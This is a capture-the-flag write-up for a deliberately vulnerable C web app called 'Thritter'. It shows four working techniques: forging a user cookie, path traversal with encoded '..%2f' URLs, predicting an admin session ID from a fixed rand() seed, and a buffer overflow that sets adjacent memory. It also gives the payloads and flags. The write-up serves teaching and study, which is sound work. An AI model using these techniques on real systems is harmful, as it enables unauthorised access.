# Thritter
> Billionaire playboy 3lon Musk has just gone public with "thritter". billed as "the first social media to only let you post three times", it's currently valued at 33 billion dollars. You've been hired by Hindenburg Research to investigate the platform's security - what can you find?

```shell
https://thritter.ctf-league.osusec.org/
```

## Process

First accessing the site we can see the main page, and the ability to go to two other pages, `mythreets` and `threets feed`.

which is at the addresss `https://thritter.ctf-league.osusec.org/mythreets` and `https://thritter.ctf-league.osusec.org/threets`.

Trying to find any hidden page, I add `/robots.txt` to the end of the url and it just shows 404 not found. 

With the challenge we are also given the source code for the site, which is based in c, in the file `thritter.c`.

Here there are a few things that stuck out, first is that flags 2, 3 and 4, are declared in the code, of course in the source code provided they are redacted, but we can see that they are there.

```c
#define FLAG_2 "REDACTED"
#define FLAG_3 "REDACTED"
#define FLAG_4 "REDACTED"
```

Trying to find where these flags interact with the code we can see that flag 2 and 4 are found in a different address under /verified

```c
// Verify our VIPs
else if (strcmp(url, "/verified") == 0) {
    if (user != 0 && strcmp(user, "Thr33lonMusk") == 0) {
        response = MHD_create_response_from_buffer (strlen(FLAG_2), FLAG_2, MHD_RESPMEM_PERSISTENT);
    }
    else if (session->likes[0] == 1633840489 && session->likes[1] == 1633969523 && session->likes[2] == 1919299174) {
        response = MHD_create_response_from_buffer (strlen(FLAG_4), FLAG_4, MHD_RESPMEM_PERSISTENT);
    }
}
```

Flag 2 is only accessible if the user is `Thr33lonMusk` so we try adding a cookie to the site, with the name of user and the value of `Thr33lonMusk`, and we get the flag.

### Flag 2

```shell
osu{but_my_blue_check}
```

## Finding Flag 1

Realizing that the we missed the first flag we go back to the source code and try and find out some information on it. 

```c
// check if request is for file in /public/ directory
// we don't want users accessing /secrets.txt!
if (strncmp("/public/", url, strlen("/public/")) == 0) {
    public = 1;
}
```

This code has a comment that tells us there is a secret directory, not normally accessible, but we can try and see if there is a flag there.

Trying to go to the address 'https://thritter.ctf-league.osusec.org/secrets.txt' the site tells us:

```text
You do not have access to that page 
```

The code itself checks for if the request comes from the public directory so a directory traversal attack should work.

Here are a few ways attempted for the attack: 

```text
https://thritter.ctf-league.osusec.org/public/../../secrets.txt
https://thritter.ctf-league.osusec.org/public/../secrets.txt
https://thritter.ctf-league.osusec.org/public/..%2fsecrets.txt
http://thritter.ctf-league.osusec.org/public/%2e%2e/secrets.txt 
```

What ended up working is:

```text
http://thritter.ctf-league.osusec.org/public/..%2fsecrets.txt
```

But here are some others that worked as well:

```text
http://thritter.ctf-league.osusec.org/public/%2f%2fsecrets.txt
http://thritter.ctf-league.osusec.org/public/%2e%2e%2f/secrets.txt
```

> for reference this was done on firefox

And the directory traversal attack worked, and we got the flag.

### Flag 1

```shell
osu{h4ck_n_sl4sh}
```
## Finding Flag 3

Now we have to find the two other flags, flag 3 and flag 4.

Flag 3 is listed in the source code here:

```c
srand(0);

struct Session adminSession;
snprintf (adminSession.sessionid,
        sizeof (adminSession.sessionid),
        "%X%X%X%X",
        (unsigned int) rand (),
        (unsigned int) rand (),
        (unsigned int) rand (),
        (unsigned int) rand ());
strcpy(adminSession.threets[0], "Just setting up my thrtr.");
strcpy(adminSession.threets[1], FLAG_3);
strcpy(adminSession.threets[2], "pretty sure this is the last social media anyone will ever need");
adminSession.num_threets = 4;
strcpy(adminSession.username, "thritter_admin");
adminSession.likes[0] = rand();
adminSession.likes[1] = rand();
adminSession.likes[2] = rand();
adminSession.next = NULL;
sessions = &adminSession;
session_count = 1;
```

We can see that it is stored in the admin Session, which is generated "randomly" and stored in the variable `adminSession`.

So we might be able to see the flag if we can access the admin session, we just have to figure out how to get the session id.

### Getting the Session ID

The session id is generated by the code here:

```c
srand(0);

struct Session adminSession;
snprintf (adminSession.sessionid,
        sizeof (adminSession.sessionid),
        "%X%X%X%X",
        (unsigned int) rand (),
        (unsigned int) rand (),
        (unsigned int) rand (),
        (unsigned int) rand ());
```

This uses a hard coded random seed, and doing some research if a seed is hard coded it will always generate the same random numbers, even on different machines.

So we took the same randoming code and random seed and added it to our own c code, and ran it to get the session id.

> this code is in 'predicting_rand.c'

```shell
98552F61E2726
```

Which is too short to be the session id, so we tried running the code again and got the same thing. 

I tried switching the complier and still got the same result, which is odd...

So I ended up connecting to OSU's engineering server and ran/complied the code there, and THIS time we got a result that might work as a session id.

```shell
66334873643C9869327B23C66B8B4567
```

> I am not sure why the code was not working on my local machine, but it worked on the server. I even tried running it on pythontutor.com which has an online C compiler and it worked there as well.

So we now have a valid admin session id, and we can try and access the admin session.

Trying to add this session to the straight base site did nothing, so we tried adding it to the `/mythreets` page, and we got the flag.

This session id was stored as a cookie and just modifing the cookie to the session id we got, we got the flag.

### Flag 3

```shell
osu{you_just_witnessed_the_strength_of_threet_knowledge}
```

## Finding Flag 4

Now we have to get the last flag, flag 4.

In the source code we can see that flag 4 is accessed based on the likes of the session, so we have to get a way to get the likes to be the same as the ones in the code.

```c
else if (session->likes[0] == 1633840489 && session->likes[1] == 1633969523 && session->likes[2] == 1919299174) {
	response = MHD_create_response_from_buffer (strlen(FLAG_4), FLAG_4, MHD_RESPMEM_PERSISTENT);
}
```

So we just have to find a way to get the likes to be the same as the ones in the code.

### Getting the EXACT likes

We can see where the likes are getting stored thanks to the source code:

```c
struct Session {
    // Session id
    char sessionid[33];
    // Used bc we use a linked list to store sessions
    struct Session *next;
    // Reference counter for # of sessions using this cookie
    unsigned int rc;
    // Time when this session was last active.
    time_t start;
    // Count threets threeted
    int num_threets;
    // Threet contents
    char threets[3][THREETLEN+1];
    int likes[3];
    char username[THREETLEN+1];
};
```

So we can see that the likes are stored in the session struct

Trying to change the likes in the cookie did not work, so we have to find a way to change the likes in the session.

Just testing around with the site we found there is no input sanitization on inputting threets, and based on the source code we can see that the number of threets per session is hard coded to 3.

And convinently the likes are stored in the session struct, after the threets

Testing this out we enter in 3 threets, and then try to enter a fourth, and we can that the likes changed for all threets after trying to enter in a fourth threet of a certain length.

So we need to find a way to change the likes to exactly the ones in the code.

```shell
likes 0 is 1633840489
likes 1 is 1633969523
likes 2 is 1919299174
```

And since its an ascii value being converted to an int in the background, we can convert the ascii values to a hex value and then convert that to an int.

```shell
1633840489 = 0x61626d69 = abmi
1633969523 = 0x61646573 = ades
1919299174 = 0x72662e66 = rf.f
```

Which if do the order of ambiadesrf.f it won't be the correct order since its not little endian, so we have to reverse the order.

```shell
1633840489 = 0x696d6261 = imba
1633969523 = 0x73656461 = sdea
1919299174 = 0x662e6672 = f.fr
```

so now we have the payload of:

```shell
imbasedaf.fr
```

this should get us the correct likes after inputting any 3 threets. 

trying just:

```shell
imbasedaf.fr
```

doesn't work, so we try:

```shell
_imbasedaf.fr
```

to get around some padding that might be happening, boom there is all the likes set to the correct values.

```text
a
-anonymous_tree#79E2 (1633840489 likes)
a
-anonymous_tree#79E2 (1633969523 likes)
a
-anonymous_tree#79E2 (1919299174 likes)
```

now we just have to migrate to the `/verified` page and we get the flag.

### Flag 4

```shell
osu{guess_we_should_call_em_fourts}
```

## Summary
pretty fun challenge, learned a lot about cookies and how to manipulate them

> ** I do not own nor did I create the content for this challenge. This is a writeup for the challenge that I solved **
